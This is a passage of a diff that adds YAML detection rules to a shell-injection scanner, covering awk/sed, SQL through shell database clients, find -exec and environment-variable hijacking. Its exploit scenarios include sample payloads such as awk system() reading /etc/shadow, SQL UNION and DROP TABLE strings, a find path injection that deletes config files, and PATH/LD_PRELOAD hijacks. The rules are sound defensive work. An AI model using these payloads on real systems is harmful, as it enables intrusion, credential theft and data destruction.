+    sink: text processing command
+    through: string concatenation
+  impact: 'Awk and sed with user-controlled patterns enable command injection
+
+    via awk system(), pipe operators, or sed e flag. Attackers can
+
+    execute arbitrary commands, read sensitive files, or establish shells.
+
+    '
+  remediation: '- Use awk -v to pass variables safely instead of string interpolation.
+
+    - Validate user patterns against a strict character allowlist.
+
+    - Avoid sed e flag which evaluates pattern space as commands.
+
+    - Prefer fixed awk/sed programs with parameterized input.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://www.gnu.org/software/gawk/manual/gawk.html
+  - https://www.gnu.org/software/sed/manual/sed.html
+  context_awareness:
+    surrounding_context_patterns:
+    - '#!/bin/bash'
+    - 'function '
+    - '| awk'
+    - '| sed'
+    taint_source_indicators:
+    - $1
+    - read pattern
+    - QUERY_STRING
+    taint_sink_indicators:
+    - 'awk '
+    - 'sed '
+    - 'gawk '
+    - system(
+    sanitization_patterns:
+    - awk -v var=
+    - '[[ =~ ^[a-zA-Z0-9]+$ ]]'
+    - sanitize
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A log search script uses awk with user-supplied pattern:
+
+      awk "/$search_term/" /var/log/app.log. An attacker provides
+
+      search_term=''/{}; system("id > /tmp/pwned"); /''
+
+      '
+    example_payload: search_term='/{}; system("cat /etc/shadow"); /'
+    attacker_objective: Execute commands via awk system() or sed e-flag
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SHELL-INJ-001
+    - SHELL-INJ-003
+- rule_id: SHELL-INJ-008
+  title: SQL Injection via Shell Database Clients
+  description: 'Detects SQL injection where user-controlled input is interpolated into SQL statements executed via shell database clients such as mysql, psql, sqlite3, sqlcmd, or mongosh. Shell scripts
+    constructing SQL queries via variable interpolation are highly vulnerable because no parameterized query mechanism exists in shell context.
+
+    '
+  language: shell
+  category: injection
+  severity: High
+  confidence: 0.94
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - sql-injection
+  - mysql-cli
+  - psql
+  - sqlite3
+  - database
+  - shell-sql
+  detection_layer: 2
+  attack_surface_type: cli
+  patterns:
+  - type: regex
+    pattern: mysql\s+.*-e\s+[^"']*\$\{?\w+\}?
+    description: mysql -e with unquoted variable in query
+  - type: regex
+    pattern: mysql\s+.*-e\s+"[^"]*\$\{?\w+\}?[^"]*"
+    description: mysql -e with variable interpolation in query
+  - type: regex
+    pattern: psql\s+.*-c\s+[^"']*\$\{?\w+\}?
+    description: psql -c with variable in SQL
+  - type: regex
+    pattern: sqlite3\s+\S+\s+"[^"]*\$\{?\w+\}?[^"]*"
+    description: sqlite3 with variable in SQL query
+  - type: regex
+    pattern: echo\s+.*\$\w+.*\|\s*(?:mysql|psql|sqlite3)
+    description: echo with variable piped to database client
+  - type: regex
+    pattern: sqlcmd\s+.*-[Qq]\s+"[^"]*\$\{?\w+\}?[^"]*"
+    description: sqlcmd with variable in query
+  - type: regex
+    pattern: mongosh?\s+.*--eval\s+"[^"]*\$\{?\w+\}?[^"]*"
+    description: mongo/mongosh --eval with variable
+  anti_patterns:
+  - '# parameterized'
+  - prepared statement
+  - mysql_real_escape
+  - 'readonly '
+  - declare -r
+  - -- migration
+  - -- schema
+  - CREATE TABLE
+  - ALTER TABLE
+  - sanitize
+  - validate
+  - whitelist
+  - allowlist
+  - escaped
+  - '# test database'
+  bypass_variants:
+  - description: SQL injection via heredoc to database client
+    pattern: (?:mysql|psql)\s+.*<<.*\n.*\$\w+
+  - description: Hex-encoded SQL payload in variable
+    pattern: echo\s+-e\s+.*\\x.*\|\s*(?:mysql|psql)
+  - description: SQL injection via file redirect
+    pattern: (?:mysql|psql)\s+.*<\s*\$\w+
+  evasion_indicators:
+  - hex-encoded SQL
+  - heredoc SQL injection
+  - file-based SQL injection
+  - double encoding
+  encoding_variants:
+  - type: hex_encoding
+    pattern: 0x[0-9a-fA-F]+.*(?:mysql|psql)
+  - type: unicode_encoding
+    pattern: N'\\u[0-9a-fA-F]{4}
+  multi_function_chain_patterns:
+  - id=$1; mysql -e "SELECT * FROM users WHERE id='$id'"
+  - name=$1; echo "SELECT * FROM t WHERE name='$name'" | psql
+  - input=$1; sqlite3 db.sqlite "SELECT * FROM data WHERE key='$input'"
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: SQL injection to read/modify database or execute OS commands via UDF
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: user-supplied ID or name
+    sink: mysql/psql -e query
+    through: string interpolation in SQL
+  - source: script parameter
+    sink: database client stdin
+    through: echo piped to client
+  impact: 'SQL injection via shell database clients can lead to complete database
+
+    compromise, including data theft, modification, deletion, and potentially
+
+    OS-level command execution via UDFs or COPY PROGRAM.
+
+    '
+  remediation: '- Never interpolate variables directly into SQL strings in shell scripts.
+
+    - Use parameterized queries through application-level database drivers.
+
+    - Restrict database user privileges to minimum required operations.
+
+    - Move database logic to application code with ORM/query builders.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://owasp.org/Top10/A03_2021-Injection/
+  - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - '#!/bin/bash'
+    - 'mysql '
+    - 'psql '
+    - 'sqlite3 '
+    taint_source_indicators:
+    - $1
+    - 'read '
+    - QUERY_STRING
+    - HTTP_
+    taint_sink_indicators:
+    - mysql -e
+    - psql -c
+    - sqlite3
+    - '| mysql'
+    - '| psql'
+    sanitization_patterns:
+    - mysql_real_escape
+    - parameterized
+    - prepared
+    - escape_string
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A shell script looks up user records via:
+
+      mysql -e "SELECT * FROM users WHERE username=''$username''".
+
+      An attacker provides username="''; DROP TABLE users; --".
+
+      '
+    example_payload: username="' UNION SELECT password FROM admin_users -- "
+    attacker_objective: Extract sensitive data or modify database records via SQL injection
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - SHELL-INJ-001
+    - SHELL-INJ-003
+- rule_id: SHELL-INJ-009
+  title: Find -exec with User-Controlled Input
+  description: 'Detects use of the find command with -exec, -execdir, or -delete actions where user-controlled input influences the path, name pattern, or executed command. The find -exec action runs a
+    command for each matched file, and when combined with user input can be weaponized for arbitrary command execution or destructive file operations.
+
+    '
+  language: shell
+  category: injection
+  severity: High
+  confidence: 0.9
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - find-injection
+  - exec-injection
+  - command-injection
+  - file-operation
+  - path-traversal
+  detection_layer: 2
+  attack_surface_type: cli
+  patterns:
+  - type: regex
+    pattern: find\s+\$\{?\w+\}?\s+
+    description: find with user-controlled search path
+  - type: regex
+    pattern: find\s+\S+\s+-name\s+[^"']*\$\{?\w+\}?
+    description: find -name with user-controlled pattern
+  - type: regex
+    pattern: find\s+.*-exec\s+.*\$\{?\w+\}?
+    description: find -exec with user-controlled command arguments
+  - type: regex
+    pattern: find\s+.*-execdir\s+.*\$\{?\w+\}?
+    description: find -execdir with user-controlled arguments
+  - type: regex
+    pattern: find\s+\$\{?\w+\}?\s+.*-delete
+    description: find -delete with user-controlled path
+  - type: regex
+    pattern: find\s+\$\{?\w+\}?\s+.*-exec\s+rm\s+
+    description: find -exec rm with user-controlled path
+  anti_patterns:
+  - find . -name
+  - find /tmp -name
+  - find /var/log
+  - 'readonly '
+  - declare -r
+  - -maxdepth 1
+  - -maxdepth 2
+  - sanitize
+  - validate
+  - whitelist
+  - allowlist
+  - realpath
+  - readlink
+  - '# cleanup temp'
+  - shellcheck
+  bypass_variants:
+  - description: Path traversal in find search directory
+    pattern: find\s+.*\.\./.*\$\w+
+  - description: Find with -exec sh -c and injection
+    pattern: find\s+.*-exec\s+sh\s+-c\s+[^;]*\$\w+
+  - description: Symlink following in find
+    pattern: find\s+-L\s+\$\w+
+  evasion_indicators:
+  - path traversal in search directory
+  - symlink following
+  - -exec sh -c injection
+  - wildcard expansion in name
+  encoding_variants:
+  - type: path_traversal
+    pattern: find\s+.*\.\.\/
+  - type: null_byte
+    pattern: find\s+.*\\x00
+  multi_function_chain_patterns:
+  - dir=$1; find $dir -exec rm {} \;
+  - pattern=$1; find /data -name $pattern -delete
+  - path=$1; find $path -type f -exec chmod 777 {} \;
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: File deletion, permission modification, or command execution via find -exec
+  business_logic_indicator:
+    financial_impact: false
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: user-supplied directory path
+    sink: find command search path
+    through: unvalidated variable
+  - source: user-supplied filename pattern
+    sink: find -name argument
+    through: unquoted variable expansion
+  impact: 'Find with user-controlled paths or commands can lead to arbitrary
+
+    file deletion, permission changes, or command execution across
+
+    the filesystem. Path traversal can expand scope to the entire filesystem.
+
+    '
+  remediation: '- Validate and canonicalize paths with realpath before passing to find.
+
+    - Use -maxdepth to restrict find scope.
+
+    - Quote all variables in find arguments.
+
+    - Avoid -exec sh -c with user input; use -exec directly.
+
+    - Restrict find to specific safe directories.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://www.gnu.org/software/findutils/manual/html_node/find_html/
+  context_awareness:
+    surrounding_context_patterns:
+    - '#!/bin/bash'
+    - 'function '
+    - 'read '
+    - cleanup
+    taint_source_indicators:
+    - $1
+    - 'read '
+    - DIRECTORY
+    - PATH
+    taint_sink_indicators:
+    - 'find '
+    - -exec
+    - -delete
+    - -execdir
+    sanitization_patterns:
+    - realpath
+    - readlink -f
+    - -maxdepth
+    - case statement
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A cleanup script uses find $user_dir -name "*.tmp" -delete.
+
+      An attacker provides user_dir="/ -name ''*.conf''" to delete
+
+      all configuration files starting from root.
+
+      '
+    example_payload: user_dir='/ -name *.conf'
+    attacker_objective: Delete or modify files across the filesystem via path injection in find
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SHELL-INJ-002
+    - SHELL-INJ-006
+- rule_id: SHELL-INJ-010
+  title: Environment Variable Injection
+  description: 'Detects patterns where user-controlled input is used to set or modify environment variables that influence command behavior. Attackers can inject malicious values into PATH, LD_PRELOAD,
+    LD_LIBRARY_PATH, IFS, BASH_ENV, or ENV to hijack command resolution, load malicious libraries, or alter shell parsing behavior for arbitrary code execution.
+
+    '
+  language: shell
+  category: injection
+  severity: High
+  confidence: 0.91
+  cwe: CWE-426
+  owasp: A03:2021-Injection
+  tags:
+  - environment-injection
+  - path-hijacking
+  - ld-preload
+  - ifs-manipulation
+  - library-injection
+  detection_layer: 1
+  attack_surface_type: cli
+  patterns:
+  - type: regex
+    pattern: export\s+(?:PATH|LD_PRELOAD|LD_LIBRARY_PATH|BASH_ENV|ENV)\s*=\s*[^"']*\$\{?\w+\}?
+    description: Export sensitive env var with user input
+  - type: regex
+    pattern: (?:PATH|LD_PRELOAD|LD_LIBRARY_PATH)\s*=\s*\$\{?\w+\}?
+    description: Set sensitive env var from user input
+  - type: regex
+    pattern: IFS\s*=\s*\$\{?\w+\}?
+    description: IFS set from user-controlled input
+  - type: regex
+    pattern: export\s+\$\{?\w+\}?\s*=\s*
+    description: Dynamic export with variable name from user input
+  - type: regex
+    pattern: env\s+\w+=\$\{?\w+\}?\s+\w+
+    description: env command setting variable from user input
+  - type: regex
+    pattern: BASH_ENV\s*=\s*\$\{?\w+\}?
+    description: BASH_ENV set from user-controlled path
+  anti_patterns:
+  - export PATH=/usr/
+  - export PATH=$HOME
+  - 'export PATH=$PATH:'
+  - 'readonly '
+  - declare -r
+  - '# default value'
+  - sanitize
+  - validate
+  - whitelist
+  - allowlist
+  - set -u
+  - set -euo
+  - '# safe: constant'
+  - ${var:-default}
+  - shellcheck
+  bypass_variants:
+  - description: PATH hijacking via prepending user directory
+    pattern: PATH=\$\w+:\$PATH
+  - description: LD_PRELOAD injection via env command
+    pattern: env\s+LD_PRELOAD=\$\w+\s+
+  - description: BASH_ENV injection for startup code execution
+    pattern: BASH_ENV=\$\w+\s+bash
+  evasion_indicators:
+  - PATH prepending
+  - LD_PRELOAD injection
+  - BASH_ENV manipulation
+  - dynamic export name
+  encoding_variants:
+  - type: path_separator
+    pattern: PATH=.*:.*\$\w+
+  - type: null_byte
+    pattern: export\s+.*\\x00
+  multi_function_chain_patterns:
+  - user_path=$1; export PATH=$user_path:$PATH
+  - lib=$1; export LD_PRELOAD=$lib
+  - read env_name; export $env_name=value
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: true
+    escalation_vector: Privilege escalation via PATH hijacking, LD_PRELOAD, or BASH_ENV injection
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: user-supplied path
+    sink: PATH environment variable
+    through: export command
+  - source: user-supplied library path
+    sink: LD_PRELOAD
+    through: environment variable assignment
+  - source: user-supplied script path
+    sink: BASH_ENV
+    through: direct assignment
+  impact: 'Environment variable injection allows attackers to hijack command
+
+    resolution (PATH), load malicious shared libraries (LD_PRELOAD),
+
+    execute code on shell startup (BASH_ENV), or alter parsing behavior
+
+    (IFS). This can lead to arbitrary code execution with elevated privileges.
+
+    '
+  remediation: '- Never set sensitive environment variables from user input.
+
+    - Use absolute paths for commands instead of relying on PATH.
+
+    - Clear dangerous environment variables at script startup.
+
+    - Set PATH to a known-safe value at the start of scripts.
+
+    - Use env -i to start with a clean environment.
+
+    '
+  references:
+  - https://cwe.mitre.org/data/definitions/426.html
+  - https://cwe.mitre.org/data/definitions/427.html
+  - https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html
+  context_awareness:
+    surrounding_context_patterns:
+    - '#!/bin/bash'
+    - 'export '
+    - 'function '
+    - 'sudo '
+    taint_source_indicators:
+    - $1
+    - 'read '
+    - QUERY_STRING
+    - HTTP_
+    taint_sink_indicators:
+    - export PATH
+    - export LD_PRELOAD
+    - BASH_ENV=
+    - IFS=
+    sanitization_patterns:
+    - unset LD_PRELOAD
+    - env -i
+    - PATH=/usr/bin:/bin
+    - readonly PATH
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 - sanitization_factor)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A deployment script adds a user-specified tool directory to PATH:
+
+      export PATH=$TOOL_DIR:$PATH. An attacker sets TOOL_DIR to a
+
+      directory containing a malicious ls binary.
+
+      '
+    example_payload: TOOL_DIR='/tmp/evil_bin'
+    attacker_objective: Hijack command resolution or inject malicious libraries for privilege escalation
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - SHELL-INJ-003
+    - SHELL-INJ-006
